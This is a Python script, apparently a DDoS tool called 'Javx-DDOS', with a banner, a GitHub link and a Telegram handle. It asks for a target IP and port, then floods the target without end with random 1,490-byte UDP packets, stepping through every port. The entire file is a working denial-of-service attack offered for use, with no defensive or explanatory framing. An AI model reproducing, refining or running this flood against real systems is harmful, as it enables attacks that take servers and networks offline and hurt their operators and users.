import sys
import os
import time as t
import socket
import random as r

from datetime import datetime

print("Wait.....")
t.sleep(3)
random_print = r.randint(37,100)
for x in range(random_print):
     print()
     t.sleep(0.05)
print(random_print)

now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = r._urandom(1490)

print("""----------------------------------------------
0       000 0       000 000     000 00       00
0  0000   0 0  0000   0 0   000   0 0  00000  0
0  00000  0 0  00000  0 0  00000  0 0        00
0  00000  0 0  00000  0 0  00000  0 0000000   0
0  0000   0 0  0000   0 0   000   0 0   000   0
0        00 0        00 000     000 00       00
----------- ----------- ----------- -----------""")
print()
print("github   : https://github.com/Javx-CV/Javx-DDOS")
print("Telegram : @SpaceGhost_n ")
print("           From _ Javx-n ")
print()
ip = input("Attack-IP : ")
port = int(input("port : "))
os.system("clear")
os.system("figlet Attack Starting")
print("Starting......")
t.sleep(2)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print("Sent %s packet to %s throught port:%s"%(sent,ip,port))
     if port == 65534:
       port = 1

